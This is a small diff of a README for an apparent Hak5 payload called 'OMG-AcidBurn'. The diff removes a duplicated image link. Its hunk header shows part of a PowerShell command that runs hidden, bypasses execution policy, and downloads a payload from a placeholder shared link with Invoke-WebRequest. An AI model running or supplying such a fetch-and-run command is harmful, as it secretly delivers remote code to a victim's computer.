@@ -54,8 +54,6 @@ powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link fo
 
 ![alt text](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/OMG-AcidBurn/hacked-wallpaper.jpg)
 
-https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/OMG-AcidBurn/hacked-wallpaper.jpg
-
 <p align="right">(<a href="#top">back to top</a>)</p>
 
 ## Contributing
